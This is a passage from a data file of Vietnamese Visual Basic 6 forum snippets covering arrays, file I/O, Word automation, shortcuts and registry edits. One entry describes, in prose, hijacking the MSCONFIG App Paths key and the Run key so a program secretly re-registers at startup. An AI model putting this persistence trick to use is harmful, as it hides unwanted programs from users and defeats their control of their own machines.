    Call MsgBox("Execute """ &amp; RegFilePath &amp; """ has been successfully !  ", vbInformation, "Success")
 
    Exit Function
 
ImportRegError:
    Call MsgBox("There was a error executing the " &amp; RegFilePath &amp; " !  ", vbCritical, "Error")
 
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084624094605</MaVD>
    <NoiDung>giongto35

Dim a() As String
 
Function xoa(vitrixoa As Integer)
For i = vitrixoa To UBound(a) - 1
a(i) = a(i + 1)
Next
ReDim Preserve a(UBound(a) - 1)
End Function
 
Private Sub Form_Load()
ReDim a(4)
    a(1) = "VietNam"
    a(2) = "Lao"
    a(3) = "Campuchia"
    a(4) = "ThaiLan"
    MsgBox "SL: " &amp; UBound(a) &amp; "  Key: " &amp; a(3)
    xoa 3
    MsgBox "SL: " &amp; UBound(a) &amp; "  Key: " &amp; a(3)
End Sub

truongphu

Private Sub Form_Load()
on error resume next
Dim a  As New Collection
    a.Add "Viêt Nam"
    a.Add "Lào"
    a.Add "Cam pu chia"
    a.Add "Thái Lan"
    MsgBox "SL: " &amp; a.Count &amp; "  Key: " &amp; a.Item(3)
a.Remove 3
    MsgBox "SL: " &amp; a.Count &amp; "  Key: " &amp; a.Item(3)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084824094827</MaVD>
    <NoiDung>Private Sub Form_Load()
On Error Resume Next
'Thu viên Shell32.dll
Dim Shl As New Shell, a As Object
With Shl   'Hôp thoai BrowseForFolder
  a = .BrowseForFolder(Me.hWnd, "Thân tang các ban! truongphu", 1)
    .TileHorizontally 'Các cua sô nàm ngang
    .TileVertically   'Các cua sô Ðu'ng
    .CascadeWindows   'Các cua sô nàm chông
    .Explore ("C:\")  'Mo' ô Ðia C:
    .FileRun        'Hôp thoai Run
    .FindFiles        'Hôp thoai Search
    .Open ("D:\")  'Mo' ô Ðia D:
    .TrayProperties    'TaskBar and start menu Properties
End With
End
'Và còn nhiêu muc Ðo'i các ban khám phá
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084924094959</MaVD>
    <NoiDung>Muốn ghi và đọc file nhị phân bạn phải mở file theo dạng: Open FileName For Binary As Filenum.
Dạng For Binary không quan tâm đến dòng, chỉ biết đến vị trí của byte đang xét.
Đọc và Ghi file: Dùng Function Get và Put như hướng dẫn ở VBLib.

Giá trị ghi có thể là số (vd: Long), chuỗi (string) hay một kiểu biến mà bạn định nghĩa.
Ghi với hàm Put phải kèm vị trí ghi. Ghi ở đầu file, vị trí ghi đương nhiên là 1.

Ghi giá trị ở vị trí nào thì phải đọc đúng vị trí ấy
Ghi giá trị theo định dạng nào thì phải đọc đúng định dạng ấy
Hệ quả: Khi ghi vào file theo dạng For Binary, với định dạng giá trị khác String, mở file thông thường, vd bằng Notepad, sẽ thấy toàn ô vuông! (nghĩa là Notepad đọc theo định dạng String nên không hiểu gì cả)

Private Type HocSinh
HoTên As String
Tuôi As Byte
GioiTính As String
Cânnang As Integer
ChiêuCao As Long
HocLuc As String
End Type
Private Sub Form_Load()
Dim a As HocSinh
a.Cânnang = 52
a.ChiêuCao = 167
a.GioiTính = "Nu"
a.HocLuc = "Gioi"
a.HoTên = "Hà Kiêu Em"
a.Tuôi = 21
Open "C:\1.txt" For Binary As #1
Put #1, 1, a
Close #1
End Sub
Private Sub Command1_Click()
Open "C:\1.txt" For Binary As #1
Dim b As HocSinh
Get #1, 1, b
MsgBox b.Cânnang &amp; vbCrLf &amp; b.ChiêuCao &amp; vbCrLf &amp; b.GioiTính &amp; vbCrLf &amp; b.HocLuc &amp; vbCrLf &amp; b.HoTên
'Chi có thê dùng lênh trong Command1 mo'i Ðoc hêt nôi dung cua C:\1.txt
End Sub </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085124095106</MaVD>
    <NoiDung>Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Sub Command1_Click() 'cut
Clipboard.SetText (Text1)
Text1 = ""
End Sub
Private Sub Command2_Click() 'copy
Clipboard.SetText (Text1)
End Sub
Private Sub Command3_Click() 'paste
Text1.SelText = Clipboard.GetText(1)
End Sub
Private Sub Command4_Click() 'undo
Call SendMessage(Text1.hwnd, &amp;H304, 0&amp;, 0&amp;)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085224095207</MaVD>
    <NoiDung>Private Type RECT
Left As Long
Top As Long
Right As Long
Bottom As Long
End Type
Private Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Private Declare Function CreatePatternBrush Lib "gdi32" (ByVal hBitmap As Long) As Long
Private Declare Function PatBlt Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal dwRop As Long) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function CreateBitmap Lib "gdi32" (ByVal nWidth As Long, ByVal nHeight As Long, ByVal nPlanes As Long, ByVal nBitCount As Long, lpBits As Any) As Long
Private Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Private Declare Function InvalidateRect Lib "user32" (ByVal hwnd As Long, ByVal lpRect As Long, ByVal bErase As Long) As Long
Private bybits(1 To 16) As Byte
Private hBitmap As Long, hBrush As Long
Private hDesktopWnd As Long
Private Sub Command1_Click()
Dim rop As Long, res As Long
Dim hdc5 As Long, width5 As Long, height5 As Long
hdc5 = GetDC(0)
width5 = Screen.Width \ Screen.TwipsPerPixelX
height5 = Screen.Height \ Screen.TwipsPerPixelY
rop = &amp;HA000C9
Call SelectObject(hdc5, hBrush)
res = PatBlt(hdc5, 0, 0, width5, height5, rop)
Call DeleteObject(hBrush)
res = ReleaseDC(0, hdc5)
End Sub
Private Sub Command2_Click()
InvalidateRect 0, 0, 1
End Sub
Private Sub Form_Load()
Dim ary
Dim i As Long
ary = Array(&amp;H55, &amp;H0, &amp;HAA, &amp;H0, _
&amp;H55, &amp;H0, &amp;HAA, &amp;H0, _
&amp;H55, &amp;H0, &amp;HAA, &amp;H0, _
&amp;H55, &amp;H0, &amp;HAA, &amp;H0)
For i = 1 To 16
bybits(i) = ary(i - 1)
Next i
hBitmap = CreateBitmap(8, 8, 1, 1, bybits(1))
hBrush = CreatePatternBrush(hBitmap)
Picture1.ForeColor = RGB(0, 0, 0)
Picture1.BackColor = RGB(255, 255, 255)
Picture1.ScaleMode = 3
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085324095319</MaVD>
    <NoiDung>Ví dụ có số Long = 123456. Code chuyển đổi như sau

Function D2B(ByVal n As Long) As String
If n = 0 Then D2B = 0
Do Until n = 0
    If (n Mod 2) Then D2B = "1" &amp; D2B Else D2B = "0" &amp; D2B
    n = n \ 2
Loop
End Function
Function B2D(ByVal s As String) As Long
For i% = 1 To Len(s)
B2D = B2D + Val(Mid(s, i, 1)) * 2 ^ (Len(s) - i)
Next
End Function
Private Sub Form_Load()
MsgBox B2D("11110001001000000")
MsgBox CLng(&amp;O361100)
MsgBox CLng(&amp;H1E240)
MsgBox D2B(123456)
MsgBox Oct(123456)
MsgBox Hex(123456)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085524095535</MaVD>
    <NoiDung>Bạn thêm cái Sysinfo vào dự án. 
rồi
Private Sub SysInfo1_DeviceArrival(ByVal DeviceType As Long, ByVal DeviceID As Long, ByVal DeviceName As String, ByVal DeviceData As Long)
MsgBox "USB da cam vao may"
End Sub
Private Sub SysInfo1_DeviceRemoveComplete(ByVal DeviceType As Long, ByVal DeviceID As Long, ByVal DeviceName As String, ByVal DeviceData As Long)
MsgBox "Da rut USB"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085724095713</MaVD>
    <NoiDung>Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" ( _
    ByVal hkey As Long, ByVal lpsubkey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" ( _
    ByVal hkey As Long, ByVal lpValueName As String, ByVal Reserved As Long, _
    ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hkey As Long) As Long
Dim duongdan As String
Dim tengoi As String
 
Private Sub Command1_Click()
        RegCreateKey &amp;H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\" &amp; tengoi &amp; ".exe", hkey
        RegSetValueEx hkey, "", 0&amp;, 1, ByVal duongdan, Len(duongdan)
        RegCloseKey hkey
    msgbox "Da them thanh cong"
End Sub
 
Private Sub Form_Load()
duongdan = "C:\Program Files\Windows Media Player\wmplayer.exe"
tengoi = "nghenhac"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080024100030</MaVD>
    <NoiDung>Private Declare Sub keybd_event Lib "user32" (ByVal bvk As Byte, ByVal bscan As Byte, ByVal dwflags As Long, ByVal dwextroinfor As Long)
 
Private Sub Form_Load()
Call keybd_event(&amp;H5B, 0, 0, 0)
Call keybd_event(77, 0, 0, 0)
Call keybd_event(&amp;H5B, 0, &amp;H32, 0)
End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080224100249</MaVD>
    <NoiDung>Dim s As Integer
Dim XPos, YPos As Integer
Dim Color As Long
Dim vLeft As Boolean, hLeft As Boolean
Private Enum LaserDrawModes
    LaserCorner
    PrinterScan
    WierdDraw
    WierdDrawSlow
End Enum
 
Private Sub LaserDraw(PictureToDraw As PictureBox, DrawSurface As Object, Optional LaserOriginX = -1, Optional LaserOriginY = -1, Optional BackColor As ColorConstants = -1, Optional LaserDrawMode As LaserDrawModes = LaserCorner)
DrawSurface.ScaleMode = vbPixels
If BackColor &lt;&gt; -1 Then
DrawSurface.BackColor = BackColor
End If
PictureToDraw.ScaleMode = vbPixels
PictureToDraw.AutoRedraw = True
PictureToDraw.Visible = False
If LaserOriginX = -1 Then
LaserOriginX = PictureToDraw.ScaleWidth
End If
If LaserOriginY = -1 Then
LaserOriginY = PictureToDraw.ScaleHeight
End If
For XPos = 0 To PictureToDraw.ScaleWidth
DoEvents
For YPos = 0 To PictureToDraw.ScaleHeight
Color = PictureToDraw.Point(XPos, YPos)
If LaserDrawMode = LaserCorner Then
DrawSurface.Line (XPos, YPos)-(LaserOriginX, LaserOriginY), Color
ElseIf LaserDrawMode = PrinterScan Then
DrawSurface.Line (XPos, YPos)-(LaserOriginX, YPos), Color
DrawSurface.Line (XPos + 1, YPos - 1)-(LaserOriginX, YPos - 1), BackColor
DoEvents
ElseIf LaserDrawMode = WierdDrawSlow Then
DrawSurface.Line (XPos, YPos)-(LaserOriginX, YPos), Color
DoEvents
Else
DrawSurface.Line (XPos, YPos)-(LaserOriginX, YPos), Color
End If
Next
Next
End Sub
Private Sub Form_Load()
Me.Show
Me.Move (Screen.Width - Me.Width) \ 2, (Screen.Height - Me.Height) \ 2
LaserDraw Picture1, Me, Me.ScaleWidth, Me.ScaleHeight, vbBlack, WierdDraw
Me.Picture = Picture1.Picture
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080324100357</MaVD>
    <NoiDung>cần file C:\Test.doc có chứa dữ liệu để thao tác
cần file C:\Test.mdb để nhập dữ liệu, trong đó có Table tên là WordParagraphs chứa 2 Fields là ParagraphNumber với định dạng là number và ParagraphText với định dạng là text
Lưu ý:
Hoạt động trên XP - SP2, các phiên bản Win khác chưa biết
Chạy trên office XP, Chưa Test trên các phiên bản MSOffice khác. Có thể không như ý muốn

Private Sub Form_Load()
Const adLockOptimistic = 3
Set objConnection = CreateObject("ADODB.Connection")
Set objRecordSet = CreateObject("ADODB.Recordset")
 
objConnection.Open _
    "Provider = Microsoft.Jet.OLEDB.4.0; " &amp; _
        "Data Source = c:\Test.mdb"
objRecordSet.Open "SELECT * FROM WordParagraphs", _
    objConnection, adOpenStatic, adLockOptimistic
Set objWord = CreateObject("Word.Application")
objWord.Visible = True
 
Set objdoc = objWord.Documents.Open("c:\Test.doc")
Set objSelection = objWord.Selection
 
For i = 1 To objdoc.Paragraphs.Count
    objdoc.Paragraphs(i).Range.Select
    If Len(objSelection.Text) &gt; 1 Then
        objRecordSet.AddNew
        objRecordSet("ParagraphNumber") = i
        objRecordSet("ParagraphText") = objSelection.Text
        objRecordSet.Update
    End If
Next
objWord.quit
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080524100523</MaVD>
    <NoiDung>Private Sub Command2_Click()
Set objShell = CreateObject("WScript.Shell")
MsgBox objShell.Exec("ipconfig").StdOut.ReadAll
Set objShell = Nothing
End Sub


Một số kết quả khá dài, bạn nên xuất ra tập tin txt

Private Sub Command4_Click()
Set objShell = CreateObject("WScript.Shell")
a = objShell.Exec("driverquery").StdOut.ReadAll
    Open "C:\1.txt" For Output As #1
        Print #1, a
    Close #1
MsgBox "Xem C:\1.txt"
Set objShell = Nothing
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080624100617</MaVD>
    <NoiDung>Cái này khá cần nếu bạn nào muốn làm một phần mềm quản lý máy, nhưng tui lại sợ ai đó lại dùng nó vào việc chế Virus thì không hay, do đó tui chỉ nêu cách làm thôi, còn Code thì bạn phải tự làm lấy  
1: Đăng ký chương trình bằng cách ghi vào Registry HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
2: Thay thế cái Msconfig trong hộp thoại Run bằng chương trình của ta bằng cách đổi giá trị Default của khóa HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\MSCONFIG.EXE bằng giá trị &lt;Tên đường dẫn đến file .exe của chương trình bạn&gt; &amp; "abc"
Trong chương trình bạn sử dụng như sau.
Trong sự kiên formload 
- kiểm tra nếu Command$()="abc" thì shell("C:\WINDOWS\PCHealth\HelpCtr\Binaries\MSConfig.exe").Đưa cái SYSINFO.OCX vào chương trình để kiểm tra sự kiện người dùng chỉnh sửa msconfig, khi sự kiện đó xảy ra bạn đăng ký lại Start up.

Một cách khác cũng cho chương trình của ta chạy kèm (tui vừa mới nghĩ ra trong lúc đang đánh bài này, nên chưa thử được) là tương tự như trên nhưng mà thay cái msconfig ta lại dùng ngay explorer (vì nó có lợi thế là khi vô Win Win sẻ tự lôi nó) Chúc thành công !</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080724100747</MaVD>
    <NoiDung>Trong các ngôn ngữ khác, ví dụ JS bạn có thể khai báo biến và gán giá trị luôn cho nó như:

var x=7;
 

Trong VB, bạn có thể làm như sau:

dim x : x=7
 

Mã vẫn gọn trên một dòng</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080824100858</MaVD>
    <NoiDung>Dim objWord
Private Sub Form_Load()
Set objWord = CreateObject("Word.Application")
objWord.ChangeFileOpenDirectory ("C:\")
objWord.FileDialog(1).Title = "Select the files"
 
If objWord.FileDialog(1).Show = -1 Then
    For Each objFile In objWord.FileDialog(1).SelectedItems
        Set objDoc = objWord.Documents.Open(objFile)
        objWord.Visible = True ' hoac = False thì tùy
        'Làm cái gì Ðây thì làm
    Next
End If
End Sub
 
Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
objWord.Quit
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081024101024</MaVD>
    <NoiDung>Private Sub Form_Load()
Dim a$
a = "Mo65t nga2y so61ng be6n anh se4 muo6n d9o72i" &amp; vbCrLf &amp; "Da64u cho mu7a ro7i d9a1 mo2n tha1ng na8m" &amp; vbCrLf &amp; "La5y tro72i d9u7o75c ye6u ma4i nhau ngu7o72i o7i!" &amp; vbCrLf &amp; "D9u72ng mang tra1i ngang chia lia2 lu71a d9o6i"
 
Set objWord = CreateObject("Word.Application")
objWord.Visible = False
 
Set objDoc = objWord.Documents.Add()
Set objSelection = objWord.Selection
 
objSelection.Font.Name = "Arial"
objSelection.Font.Size = "18"
objSelection.TypeText "Mùa Thu Lá Bay" &amp; vbCrLf
 
objSelection.Font.Size = "14"
objSelection.TypeText Date &amp; vbCrLf &amp; vbCrLf
objSelection.TypeText ToUni(a)
objSelection.Font.Size = "10"
 
objDoc.SaveAs ("C:\Mùa Thu Lá Bay.doc")
objWord.Quit
 
End Sub
Public Function ToUni(str$) As String 'TrungDung1977
    Dim ansi$, UNI$, i&amp;, sTem$, sUni$, arrUNI() As String
    ansi = "a1|a2|a3|a4|a5|a6|a8|a61a62a63a64a65a81a82a83a84a85A1|A2|A3|A4|A5|A6|A8|A61A62A63A64A65A81A82A83A84A85e1|e2|e3|e4|e5|e6|e61e62e63e64e65E1|E2|E3|E4|E5|E6|E61E62E63E64E65i1|i2|i3|i4|i5|I1|I2|I3|I4|I5|o1|o2|o3|o4|o5|o6|o7|o61o62o63o64o65o71o72o73o74o75O1|O2|O3|O4|O5|O6|O7|O61O62O63O64O65O71O72O73O74O75u1|u2|u3|u4|u5|u7|u71u72u73u74u75U1|U2|U3|U4|U5|U7|U71U72U73U74U75y1|y2|y3|y4|y5|Y1|Y2|Y3|Y4|Y5|d9|D9|"
    UNI = "E1,E0,1EA3,E3,1EA1,E2,103,1EA5,1EA7,1EA9,1EAB,1EAD,1EAF,1EB1,1EB3,1EB5,1EB7,C1,C0,1EA2,C3,1EA0,C2,102,1EA4,1EA6,1EA8,1EAA,1EAC,1EAE,1EB0,1EB2,1EB4,1EB6,E9,E8,1EBB,1EBD,1EB9,EA,1EBF,1EC1,1EC3,1EC5,1EC7,C9,C8,1EBA,1EBC,1EB8,CA,1EBE,1EC0,1EC2,1EC4,1EC6,ED,EC,1EC9,129,1ECB,CD,CC,1EC8,128,1ECA,F3,F2,1ECF,F5,1ECD,F4,1A1,1ED1,1ED3,1ED5,1ED7,1ED9,1EDB,1EDD,1EDF,1EE1,1EE3,D3,D2,1ECE,D5,1ECC,D4,1A0,1ED0,1ED2,1ED4,1ED6,1ED8,1EDA,1EDC,1EDE,1EE0,1EE2,FA,F9,1EE7,169,1EE5,1B0,1EE9,1EEB,1EED,1EEF,1EF1,DA,D9,1EE6,168,1EE4,1AF,1EE8,1EEA,1EEC,1EEE,1EF0,FD,1EF3,1EF7,1EF9,1EF5,DD,1EF2,1EF6,1EF8,1EF4,111,110"
    arrUNI = Split(UNI, ",")
    
    For i = 1 To Len(str)
        If IsNumeric(Mid(str, i + 1, 1)) = False Then
            sUni = sUni &amp; Mid(str, i, 1)
        Else
            sTem = IIf(IsNumeric(Mid(str, i + 2, 1)), Mid(str, i, 3), Mid(str, i, 2))
            i = i + IIf(IsNumeric(Mid(str, i + 2, 1)), 2, 1)
            If InStr(ansi, sTem) &gt; 0 Then sTem = ChrW("&amp;h" &amp; arrUNI(InStr(ansi, sTem) \ 3))
            sUni = sUni &amp; sTem
        End If
    Next
    ToUni = sUni
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081224101244</MaVD>
    <NoiDung>1 Tới Website
 
Private Sub Form_Load()
Open "C:\Caulacbovb.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=http://www.caulacbovb.com/"
'Print #1, "IconIndex = 0"
'Print #1, "IconFile=C:\WINDOWS\explorer.exe"
Close #1
End Sub


2 Shortcut đến Email
 
Private Sub Form_Load()
Open "C:\mail.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=mailto:voquanghoa@gmail.com"
'Print #1, "IconIndex = 0"
'Print #1, "IconFile=C:\WINDOWS\explorer.exe"
Close #1
End Sub

3 Shortcut đến Thư mục
 
Private Sub Form_Load()
Open "C:\Shortcut to new folder.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=D:\New folder"
Print #1, "IconIndex = 3"
Print #1, "IconFile=%SystemRoot%\system32\SHELL32.dll"
Close #1
End Sub


4 Shortcut đến file .exe

Private Sub Form_Load()
Open "C:\Shortcut to project1.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=D:\Project1.exe"
Print #1, "IconIndex = 0"
Print #1, "IconFile=D:\Project1.exe"
Close #1
End Sub

GOOD LUCK !
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000179</MaVD>
    <NoiDung>Private Function TaoShortCut(TenFileShortCut As String, StrName As String, _ 
   Optional strPram As String, Optional strStratIn As String, _ 
   Optional strIcon As String, Optional strComment As String, _ 
   Optional strHotKeys As String) 
   Dim OBJ As Object, oShellLink As Object 
   Set OBJ = CreateObject("wscript.shell") 
   Set oShellLink = OBJ.CreateShortcut(OBJ.SpecialFolders("Desktop") &amp; _
   "\" &amp; TenFileShortCut) 
   With oShellLink 
   .TargetPath = StrName 
   .Arguments = strPram 
   .WorkingDirectory = strStratIn 
   If strIcon = " Then strIcon = StrName 
   .IconLocation = strIcon 
   .Description = strComment 
   .Save 
   End With 
End Function

Bổ sung của tác giả  Võ Quang Hòa

1 Tới Website
 
Private Sub Form_Load()
Open "C:\Caulacbovb.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=http://www.caulacbovb.com/"
'Print #1, "IconIndex = 0"
'Print #1, "IconFile=C:\WINDOWS\explorer.exe"
Close #1
End Sub


2 Shortcut đến Email
 
Private Sub Form_Load()
Open "C:\mail.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=mailto:voquanghoa@gmail.com"
'Print #1, "IconIndex = 0"
'Print #1, "IconFile=C:\WINDOWS\explorer.exe"
Close #1
End Sub

3 Shortcut đến Thư mục
 
Private Sub Form_Load()
Open "C:\Shortcut to new folder.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=D:\New folder"
Print #1, "IconIndex = 3"
Print #1, "IconFile=%SystemRoot%\system32\SHELL32.dll"
Close #1
End Sub


4 Shortcut đến file .exe

Private Sub Form_Load()
Open "C:\Shortcut to project1.url" For Output As #1
Print #1, "[InternetShortcut]"
Print #1, "URL=D:\Project1.exe"
Print #1, "IconIndex = 0"
Print #1, "IconFile=D:\Project1.exe"
Close #1
End Sub

GOOD LUCK !</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083227083218</MaVD>
    <NoiDung>Private Sub DoEffect()
    On Error Resume Next
    Dim lY1 As Integer, Red As Integer
    Me.ScaleHeight = 512
    Me.ScaleWidth = 512
    Cls
    Do
        Red = Red + 1
        If Red &lt; 255 Then Me.ForeColor = RGB(0, Red, 0)
        lY1 = lY1 + 3
        Me.Line (0, lY1)-(Me.ScaleWidth, lY1)
        Me.Line (lY1, 0)-(Me.ScaleHeight, lY1)
        If lY1 &gt; Me.ScaleHeight Then Exit Sub
    Loop
End Sub
 
Private Sub Form_Load()
    Me.AutoRedraw = False
End Sub
 
Private Sub Form_Paint()
    DoEffect
End Sub
 
Private Sub Form_Resize()
    DoEffect
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083627083610</MaVD>
    <NoiDung>với nội dung:
chuỗi = 1ca6u0la5c0bo650v7b89
có cách nào tách bỏ số từ chuỗi đó với 1 câu lệnh replace?
Code sau đây có thể thỏa mãn yêu cầu


Set objRegEx = CreateObject("VBScript.RegExp")
objRegEx.Global = True
objRegEx.Pattern = "[^A-Za-z]"
strSearch = objRegEx.Replace("1ca6u0la5c0bo650v7b89", "")  '&lt;-- 1 câu lênh, không For... Next!</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084627084652</MaVD>
    <NoiDung>Sub En_Decode(FilePath$,KeyPass)
If FilePath  = ""  Or FileExists(FilePath) = False Then Exit Function' Hàm FileExists tham khảo trong diễn đàn.
KeyPass=Clng(KeyPass)
KeyPass=Asb(KeyPass)
Dim X As Single
Dim I As Long
DIm FileNum As Integer
Dim tempChar As String * 1
Dim tempAsc As Integer
Dim RandomInteger As Integer
X = Rnd(-KeyPass)
FileNum = FreeFile
Open FilePath For Binary As #FileNum
For I =1 To LOF(FileNum)
Get #FileNum,I,tempChar' Lấy từng ký tự
RandomInteger = Int(Rnd*256)
tempAsc = Asc(tempChar)' Lấy mã ASCII
tempAsc = tempAsc Xor RandomInteger' Mã hóa mã ASCII của ký tự
tempChar = Chr(tempAsc)' Đưa về dạng ký tự để đặt vào vị trí cũ
Put #FileNum,I,tempChar
Next I
Close #FileNum
End Function

Sub này thường dùng khi chỉ muốn chương trình của mình hoặc ai có đặc quyền mới được xem một tệp tin nào đó
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085027085027</MaVD>
    <NoiDung>Private Sub Form_Load()
Set objWord = CreateObject("Word.Application")
MsgBox "NumLock key is on: " &amp; objWord.NumLock &amp; vbCr &amp; "CapsLock key is on: " &amp; objWord.CapsLock
Set objShell = CreateObject("WScript.Shell")
objShell.SendKeys "{NUMLOCK}":   objShell.SendKeys "{CAPSLOCK}"
MsgBox "NumLock key is on: " &amp; objWord.NumLock &amp; vbCr &amp; "CapsLock key is on: " &amp; objWord.CapsLock
objWord.Quit
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085227085239</MaVD>
    <NoiDung>'Trong module
Private Type PREVENT_MEDIA_REMOVAL
   PreventMediaRemoval As Byte
End Type
  
Private Declare Function CreateFile Lib "kernel32.dll" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Any, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function DeviceIoControl Lib "kernel32.dll" (ByVal hDevice As Long, ByVal dwIoControlCode As Long, lpInBuffer As Any, ByVal nInBufferSize As Long, lpOutBuffer As Any, ByVal nOutBufferSize As Long, lpBytesReturned As Long, lpOverlapped As Any) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Const INVALID_HANDLE_VALUE As Long = -1&amp;
Private Const GENERIC_READ As Long = &amp;H80000000
Private Const FILE_SHARE_READ As Long = &amp;H1
Private Const FILE_SHARE_WRITE As Long = &amp;H2
Private Const OPEN_EXISTING As Long = 3
Private Const FILE_ATTRIBUTE_NORMAL As Long = &amp;H80
Private Const ERROR_ACCESS_DENIED As Long = 5&amp;
Private Const IOCTL_STORAGE_MEDIA_REMOVAL As Long = &amp;H2D4804
Private hDevice As Long
 
Public Sub ToggleDrive(ByVal sDrive As String, bLock As Boolean)
    Dim dwRetval As Long
    Dim pmr As PREVENT_MEDIA_REMOVAL
    Dim hDevice As Long
    
    pmr.PreventMediaRemoval = bLock
    hDevice = 0
    dwRetval = 0
    
    'Lay handle cua drive
    hDevice = CreateFile("\\.\" &amp; sDrive &amp; ":", GENERIC_READ, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0, OPEN_EXISTING, 0, 0)
    If hDevice = INVALID_HANDLE_VALUE Then
        MsgBox "Khong tim thay drive"
        Exit Sub
    End If
    
    'Khoa lai
    If DeviceIoControl(hDevice, IOCTL_STORAGE_MEDIA_REMOVAL, pmr, Len(pmr), 0, 0, dwRetval, 0) = 0 Then
        MsgBox "Co loi khi tac dong den drive"
    End If
    
    CloseHandle hDevice
End Sub

Cách dùng:
khóa: ToggleDrive "E", True
mở khóa: ToggleDrive "E", False</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085427085458</MaVD>
    <NoiDung>'Bỏ vô module
Private Declare Function IIDFromString Lib "ole32" (ByVal lpszIID As Long, iid As Any) As Long
Private Declare Function CoCreateInstance Lib "ole32" (rclsid As Any, ByVal pUnkOuter As Long, ByVal dwClsContext As Long, riid As Any, ByVal ppv As Long) As Long
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (pDst As Any, pSrc As Any, ByVal dlen As Long)
 
Private Const CLSCTX_INPROC_SERVER  As Long = 1&amp;
Private Const CLSID_ActiveDesktop   As String = "{75048700-EF1F-11D0-9888-006097DEACF9}"
Private Const IID_ActiveDesktop     As String = "{F490EB00-1240-11D1-9888-006097DEACF9}"
 
Private Type GUID
  data1                   As Long
  data2                   As Integer
  data3                   As Integer
  data4(7)                As Byte
End Type
 
Private Type IActiveDesktop
  QueryInterface          As Long
  AddRef                  As Long
  Release                 As Long
  ApplyChanges            As Long
  GetWallpaper            As Long
  SetWallpaper            As Long
  GetWallpaperOptions     As Long
  SetWallpaperOptions     As Long
  GetPattern              As Long
  SetPattern              As Long
  GetDesktopItemOptions   As Long
  SetDesktopItemOptions   As Long
  AddDesktopItem          As Long
  AddDesktopItemWithUI    As Long
  ModifyDesktopItem       As Long
  RemoveDesktopItem       As Long
  GetDesktopItemCount     As Long
  GetDesktopItem          As Long
  GetDesktopItemByID      As Long
  GenerateDesktopItemHtml As Long
  AddUrl                  As Long
  GetDesktopItemBySource  As Long
End Type
 
Private Enum AD_APPLY
  AD_APPLY_SAVE = &amp;H1
  AD_APPLY_HTMLGEN = &amp;H2
  AD_APPLY_REFRESH = &amp;H4
  AD_APPLY_ALL = &amp;H7
  AD_APPLY_FORCE = &amp;H8
  AD_APPLY_BUFFERED_REFRESH = &amp;H10
  AD_APPLY_DYNAMICREFRESH = &amp;H20
End Enum
 
Public Function SetWallpaper(ByVal strFile As String) As Boolean
 
    Dim vtbl            As IActiveDesktop
    Dim vtblptr         As Long
 
    Dim classid         As GUID
    Dim iid             As GUID
 
    Dim obj             As Long
    Dim hRes            As Long
 
    hRes = IIDFromString(StrPtr(CLSID_ActiveDesktop), classid)
    If hRes &lt;&gt; 0 Then
        Exit Function
    End If
 
